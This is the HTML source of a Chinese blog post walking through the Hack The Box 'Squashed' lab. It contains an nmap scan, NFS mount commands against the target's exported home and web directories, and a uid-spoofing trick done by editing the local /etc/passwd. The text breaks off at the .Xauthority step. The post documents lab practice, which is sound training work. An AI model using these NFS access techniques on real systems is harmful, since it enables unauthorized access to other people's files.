@@ -1,0 +1,874 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta name="referrer" content="no-referrer">
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Squashed | Someb0dy&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="NFS,.Xauthority">
+    <meta name="description" content="2023年6月21日 22:43:44  Nmap┌──(root💀kali)-[&#x2F;home&#x2F;kali&#x2F;hacktheboxtools] └─# nmap -sCV 10.10.11.191                           130 ⨯ Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-21 11:05 EDT Stats:">
+<meta name="keywords" content="NFS,.Xauthority">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Squashed">
+<meta property="og:url" content="someb0dy.github.io/2023/06/26/Squashed/index.html">
+<meta property="og:site_name" content="Someb0dy&#39;s blog">
+<meta property="og:description" content="2023年6月21日 22:43:44  Nmap┌──(root💀kali)-[&#x2F;home&#x2F;kali&#x2F;hacktheboxtools] └─# nmap -sCV 10.10.11.191                           130 ⨯ Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-21 11:05 EDT Stats:">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687360086416-a0870d55-5dda-4896-bc91-a871e2a0d42c.png#averageHue=%23e9e8e8&clientId=u0ccc4ae2-e6a7-4&from=paste&height=766&id=u39e70ebf&originHeight=958&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1268906&status=done&style=none&taskId=u5e280195-0993-4bcf-b0f3-ea2f905919e&title=&width=1528.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687360466242-e5329b9a-4143-48d1-a58d-ca1df0304248.png#averageHue=%2321272c&clientId=u0ccc4ae2-e6a7-4&from=paste&height=543&id=uef1abbb9&originHeight=679&originWidth=1124&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=129122&status=done&style=none&taskId=u67c9a1df-85f4-45ac-8040-0da20e1e88c&title=&width=899.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687360535748-628ba7cb-bdf3-4a59-a61c-89e9bf79331e.png#averageHue=%23141414&clientId=u0ccc4ae2-e6a7-4&from=paste&height=543&id=u5765bd65&originHeight=679&originWidth=1468&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93198&status=done&style=none&taskId=uc9ba2e08-8b72-43ff-baad-49a7d1ed6e6&title=&width=1174.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687360882999-b70ed902-d5a8-408a-8110-37cfb24b91f6.png#averageHue=%231d2226&clientId=u0ccc4ae2-e6a7-4&from=paste&height=466&id=u3d4fa5a0&originHeight=582&originWidth=1131&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47313&status=done&style=none&taskId=u9d805dea-42b6-48c1-b352-fbcba5a7382&title=&width=904.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687362444226-13692082-bf37-4e0d-be7d-7a156a885788.png#averageHue=%231e1b1a&clientId=u0ccc4ae2-e6a7-4&from=paste&height=399&id=u5868b683&originHeight=499&originWidth=1527&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=132314&status=done&style=none&taskId=ucbc99ff2-0520-4b8b-a03f-b585e6c8d17&title=&width=1221.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687362721268-0a7b137e-3dfb-4f8e-99f3-9d31e3ec01b7.png#averageHue=%231c1b1b&clientId=u0ccc4ae2-e6a7-4&from=paste&height=617&id=u5709c6b4&originHeight=771&originWidth=1541&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=200236&status=done&style=none&taskId=uf30b2aa1-16e8-4803-bdd3-fbb21221e60&title=&width=1232.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687363023286-71f4eafe-7770-448c-942b-b544e08c7fb2.png#averageHue=%23191919&clientId=u0ccc4ae2-e6a7-4&from=paste&height=166&id=ufc4c8e04&originHeight=207&originWidth=732&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21787&status=done&style=none&taskId=uc76c1872-0d7f-4efd-bc78-6a2ee7e617c&title=&width=585.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687363302574-0847ec2c-cac6-4f07-a997-03507cb8c019.png#averageHue=%23171717&clientId=u0ccc4ae2-e6a7-4&from=paste&height=296&id=uc8013153&originHeight=370&originWidth=666&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36778&status=done&style=none&taskId=u2b0144ac-8173-4317-97f3-afec0bb492b&title=&width=532.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687363104623-66f98fd8-d2ca-44fb-b9a3-84993edd5fc3.png#averageHue=%23191818&clientId=u0ccc4ae2-e6a7-4&from=paste&height=146&id=u9e8afe29&originHeight=183&originWidth=690&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23218&status=done&style=none&taskId=u7b6ee7d0-94e5-4253-84f8-0f174692594&title=&width=552">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687363472962-769ee494-f66a-404c-bd3f-7b344a300697.png#averageHue=%23181818&clientId=u0ccc4ae2-e6a7-4&from=paste&height=431&id=u27339839&originHeight=539&originWidth=680&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60600&status=done&style=none&taskId=uf6cc5ba9-597d-4aec-8bf4-5bfa7155777&title=&width=544">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687363945028-f4db6776-2909-417b-b569-c177ebd714e9.png#averageHue=%23161616&clientId=u0ccc4ae2-e6a7-4&from=paste&height=524&id=u758d7081&originHeight=655&originWidth=1479&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=157193&status=done&style=none&taskId=u1ff80117-137c-445e-8052-a14d928928e&title=&width=1183.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687404025477-3553b028-0584-4b78-943a-aa5c05c17faa.png#averageHue=%232e2d2d&clientId=u0ccc4ae2-e6a7-4&from=paste&height=427&id=ue6186a66&originHeight=534&originWidth=1245&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=94883&status=done&style=none&taskId=u5bd38796-52e6-487b-8a0a-93b935d5506&title=&width=996">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687363953396-bc11c3b1-255b-4fb9-88ed-d5499cc547fc.png#averageHue=%23101010&clientId=u0ccc4ae2-e6a7-4&from=paste&height=338&id=ubd265945&originHeight=423&originWidth=1027&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33042&status=done&style=none&taskId=uea9480b3-f7e0-4c9b-b6ec-e55495384df&title=&width=821.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687404341141-8b60a1be-f0fc-4efb-803a-a03382d397fd.png#averageHue=%231e242a&clientId=u0ccc4ae2-e6a7-4&from=paste&height=200&id=u4f6846fd&originHeight=250&originWidth=1080&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48499&status=done&style=none&taskId=u66591a0c-0a03-4702-872c-2453ad6cab8&title=&width=864">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687400305821-9def45bd-804b-41c0-a84c-2858868a09b2.png#averageHue=%23131313&clientId=u0ccc4ae2-e6a7-4&from=paste&height=634&id=uda6d4ab2&originHeight=792&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=167225&status=done&style=none&taskId=ua4ce1c19-ca95-425e-ad8b-7aae5bc5b75&title=&width=1534.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687400713149-29900d5d-570e-4522-b5d6-d8eecbd0cea3.png#averageHue=%231f242a&clientId=u0ccc4ae2-e6a7-4&from=paste&height=295&id=u06c3e4e5&originHeight=369&originWidth=1098&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29276&status=done&style=none&taskId=u848062ed-95af-423d-9d72-f7b02862f29&title=&width=878.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687400484593-91a9b348-f1cb-47be-9fd7-b542c87fbbc2.png#averageHue=%23151313&clientId=u0ccc4ae2-e6a7-4&from=paste&height=677&id=u20b09bbc&originHeight=846&originWidth=1615&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=113439&status=done&style=none&taskId=ud084f1e5-cfbc-4a33-b2e3-436fb8a1752&title=&width=1292">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687403393785-948f6f29-29b3-47ea-94ac-6887e3cf234d.png#averageHue=%231e2328&clientId=u0ccc4ae2-e6a7-4&from=paste&height=175&id=u13f7bebd&originHeight=219&originWidth=1068&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16833&status=done&style=none&taskId=ud71319fb-06a8-449e-b981-9d6e66afb93&title=&width=854.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687402827427-5fea3b8c-14fb-4681-85ec-6fbc29e20be8.png#averageHue=%23141414&clientId=u0ccc4ae2-e6a7-4&from=paste&height=380&id=iJFNU&originHeight=475&originWidth=1339&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=52187&status=done&style=none&taskId=ue8523131-2fdd-4f98-aa54-002f364ec8b&title=&width=1071.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687402950218-87f3ff4b-25ea-4268-a0ce-ac43176c713a.png#averageHue=%23121212&clientId=u0ccc4ae2-e6a7-4&from=paste&height=559&id=LnEQC&originHeight=699&originWidth=1521&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75598&status=done&style=none&taskId=uf1c3de42-7af4-4f49-b530-d8fe5e6ab95&title=&width=1216.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687402981270-5dab7cd1-6d9e-45f8-ac1d-2ef8d0c72e2c.png#averageHue=%23243247&clientId=u0ccc4ae2-e6a7-4&from=paste&height=690&id=Atg4O&originHeight=862&originWidth=1658&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=980003&status=done&style=none&taskId=ue58f0d57-73c0-46fd-955c-0946c796893&title=&width=1326.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687403581080-b19ec9ec-64e9-48d6-a28d-398a180454e3.png#averageHue=%23151515&clientId=u0ccc4ae2-e6a7-4&from=paste&height=162&id=u2277e337&originHeight=203&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37382&status=done&style=none&taskId=u5ce330f7-3e21-43e4-94ed-bce20f80976&title=&width=1534.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687403182371-cd7b2e5c-be23-4019-8861-1b9776efc021.png#averageHue=%2378afa3&clientId=u0ccc4ae2-e6a7-4&from=paste&height=631&id=ucd8eaf2e&originHeight=789&originWidth=1668&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=470385&status=done&style=none&taskId=u48ca5d9d-0f67-4727-8163-6d27b39ce40&title=&width=1334.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687403282136-5804db3a-2ab1-4264-8048-1003370de540.png#averageHue=%23131313&clientId=u0ccc4ae2-e6a7-4&from=paste&height=361&id=uf9e2aaf2&originHeight=451&originWidth=810&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35459&status=done&style=none&taskId=uf41297a8-224f-4a9f-b65c-575f4bba0c7&title=&width=648">
+<meta property="og:updated_time" content="2023-06-25T16:13:26.942Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687360086416-a0870d55-5dda-4896-bc91-a871e2a0d42c.png#averageHue=%23e9e8e8&clientId=u0ccc4ae2-e6a7-4&from=paste&height=766&id=u39e70ebf&originHeight=958&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1268906&status=done&style=none&taskId=u5e280195-0993-4bcf-b0f3-ea2f905919e&title=&width=1528.8">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Someb0dy</h5>
+          <a href="mailto:1362460837@qq.com" target="_blank" rel="noopener" title="1362460837@qq.com" class="mail">1362460837@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Giraffe711" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Squashed</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Squashed</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2023-06-25T16:10:58.212Z" itemprop="datePublished" class="page-time">
+  2023-06-26
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB/">HTB</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">1.</span> <span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.</span> <span class="post-toc-text">80</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#2049–NFS"><span class="post-toc-number">3.</span> <span class="post-toc-text">2049–NFS</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#msf扫描脚本"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">msf扫描脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#mount-挂载"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">mount 挂载</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Xauthority"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">.Xauthority</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#x2F-var-x2F-www-x2F-html"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">/var/www/html</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root"><span class="post-toc-number">4.</span> <span class="post-toc-text">root</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#上传-Xauthority文件"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">上传.Xauthority文件</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#授权验证尝试"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">授权验证尝试</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#获取屏幕截图"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">获取屏幕截图</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#下载文件—-screenshoot-xwd"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">下载文件—-screenshoot.xwd</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#通过web目录"><span class="post-toc-number">4.4.1.</span> <span class="post-toc-text">通过web目录</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#通过nc-的命令"><span class="post-toc-number">4.4.2.</span> <span class="post-toc-text">通过nc 的命令</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">5.</span> <span class="post-toc-text">总结</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Squashed"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Squashed</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2023-06-26 00:10:58" datetime="2023-06-25T16:10:58.212Z"  itemprop="datePublished">2023-06-26</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB/">HTB</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <pre><code class="rust">2023年6月21日 22:43:44
+</code></pre>
+<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><pre><code class="rust">┌──(root💀kali)-[/home/kali/hacktheboxtools]
+└─# nmap -sCV 10.10.11.191                           130 ⨯
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-21 11:05 EDT
+Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.82% done; ETC: 11:06 (0:00:00 remaining)
+Nmap scan report for 10.10.11.191
+Host is up (0.90s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
+|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Built Better
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      39773/tcp   mountd
+|   100005  1,2,3      41561/udp   mountd
+|   100005  1,2,3      46976/udp6  mountd
+|   100005  1,2,3      49217/tcp6  mountd
+|   100021  1,3,4      39445/tcp6  nlockmgr
+|   100021  1,3,4      41743/tcp   nlockmgr
+|   100021  1,3,4      49344/udp6  nlockmgr
+|   100021  1,3,4      52702/udp   nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+2049/tcp open  nfs_acl 3 (RPC #100227)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 41.30 seconds
+</code></pre>
+<h1 id="80"><a href="#80" class="headerlink" title="80"></a>80</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687360086416-a0870d55-5dda-4896-bc91-a871e2a0d42c.png#averageHue=%23e9e8e8&clientId=u0ccc4ae2-e6a7-4&from=paste&height=766&id=u39e70ebf&originHeight=958&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1268906&status=done&style=none&taskId=u5e280195-0993-4bcf-b0f3-ea2f905919e&title=&width=1528.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>没有什么利用价值，纯静态界面</p>
+<h1 id="2049–NFS"><a href="#2049–NFS" class="headerlink" title="2049–NFS"></a>2049–NFS</h1><p>Refer:<a href="https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687360466242-e5329b9a-4143-48d1-a58d-ca1df0304248.png#averageHue=%2321272c&clientId=u0ccc4ae2-e6a7-4&from=paste&height=543&id=uef1abbb9&originHeight=679&originWidth=1124&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=129122&status=done&style=none&taskId=u67c9a1df-85f4-45ac-8040-0da20e1e88c&title=&width=899.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>大概的意思就是说nfs 没有基本的鉴权的功能，主要就是根据uid&#x2F;gid 来进行鉴权</p>
+<h2 id="msf扫描脚本"><a href="#msf扫描脚本" class="headerlink" title="msf扫描脚本"></a>msf扫描脚本</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687360535748-628ba7cb-bdf3-4a59-a61c-89e9bf79331e.png#averageHue=%23141414&clientId=u0ccc4ae2-e6a7-4&from=paste&height=543&id=u5765bd65&originHeight=679&originWidth=1468&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93198&status=done&style=none&taskId=uc9ba2e08-8b72-43ff-baad-49a7d1ed6e6&title=&width=1174.4" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="mount-挂载"><a href="#mount-挂载" class="headerlink" title="mount 挂载"></a>mount 挂载</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687360882999-b70ed902-d5a8-408a-8110-37cfb24b91f6.png#averageHue=%231d2226&clientId=u0ccc4ae2-e6a7-4&from=paste&height=466&id=u3d4fa5a0&originHeight=582&originWidth=1131&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47313&status=done&style=none&taskId=u9d805dea-42b6-48c1-b352-fbcba5a7382&title=&width=904.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<pre><code class="rust">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine]
+└─# cd Squashed                                                                                                                                             1 ⨯
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─# ls
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─# mkdir ross
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─# mkdir html
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─# ls
+html  ross
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─# mount -t nfs 10.10.11.191:/home/ross ./ross -o nolock                                                                                                   1 ⨯
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─# ls
+html  ross
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─# ls -al
+total 16
+drwxr-xr-x  4 root root 4096 Jun 21 11:17 .
+drwxr-xr-x 33 root root 4096 Jun 21 11:17 ..
+drwxr-xr-x  2 root root 4096 Jun 21 11:17 html
+drwxr-xr-x 14 cjl  cjl  4096 Jun 21 01:23 ross
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─# cd ross
+l                                                                                                                                                               
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/Squashed/ross]
+└─# ls -al
+total 68
+drwxr-xr-x 14 cjl  cjl  4096 Jun 21 01:23 .
+drwxr-xr-x  4 root root 4096 Jun 21 11:17 ..
+lrwxrwxrwx  1 root root    9 Oct 20  2022 .bash_history -&gt; /dev/null
+drwx------ 11 cjl  cjl  4096 Oct 21  2022 .cache
+drwx------ 12 cjl  cjl  4096 Oct 21  2022 .config
+drwxr-xr-x  2 cjl  cjl  4096 Oct 21  2022 Desktop
+drwxr-xr-x  2 cjl  cjl  4096 Oct 21  2022 Documents
+drwxr-xr-x  2 cjl  cjl  4096 Oct 21  2022 Downloads
+drwx------  3 cjl  cjl  4096 Oct 21  2022 .gnupg
+drwx------  3 cjl  cjl  4096 Oct 21  2022 .local
+drwxr-xr-x  2 cjl  cjl  4096 Oct 21  2022 Music
+drwxr-xr-x  2 cjl  cjl  4096 Oct 21  2022 Pictures
+drwxr-xr-x  2 cjl  cjl  4096 Oct 21  2022 Public
+drwxr-xr-x  2 cjl  cjl  4096 Oct 21  2022 Templates
+drwxr-xr-x  2 cjl  cjl  4096 Oct 21  2022 Videos
+lrwxrwxrwx  1 root root    9 Oct 21  2022 .viminfo -&gt; /dev/null
+-rw-------  1 cjl  cjl    57 Jun 21 01:23 .Xauthority
+-rw-------  1 cjl  cjl  2475 Jun 21 01:23 .xsession-errors
+-rw-------  1 cjl  cjl  2475 Dec 27 10:33 .xsession-errors.old
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/Squashed/ross]
+└─# cd ..
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─# ls
+html  ross
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─# mount -t nfs 10.10.11.191:/var/www/html ./html -o nolock
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─#
+</code></pre>
+<p>挂载之后我们就可以访问 目标机器上的</p>
+<ol>
+<li>&#x2F;var&#x2F;www&#x2F;html</li>
+<li>&#x2F;home&#x2F;ross</li>
+</ol>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687362444226-13692082-bf37-4e0d-be7d-7a156a885788.png#averageHue=%231e1b1a&clientId=u0ccc4ae2-e6a7-4&from=paste&height=399&id=u5868b683&originHeight=499&originWidth=1527&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=132314&status=done&style=none&taskId=ucbc99ff2-0520-4b8b-a03f-b585e6c8d17&title=&width=1221.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>进去发现文件权限都为uid&#x3D;1001所有</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687362721268-0a7b137e-3dfb-4f8e-99f3-9d31e3ec01b7.png#averageHue=%231c1b1b&clientId=u0ccc4ae2-e6a7-4&from=paste&height=617&id=u5709c6b4&originHeight=771&originWidth=1541&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=200236&status=done&style=none&taskId=uf30b2aa1-16e8-4803-bdd3-fbb21221e60&title=&width=1232.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>当我把&#x2F;etc&#x2F;passwd文件中,uid&#x3D;1001的用户的名字修改为someb0dy，并且重新挂载 发现文件所属变成someb0dy了</p>
+<h2 id="Xauthority"><a href="#Xauthority" class="headerlink" title=".Xauthority"></a>.Xauthority</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
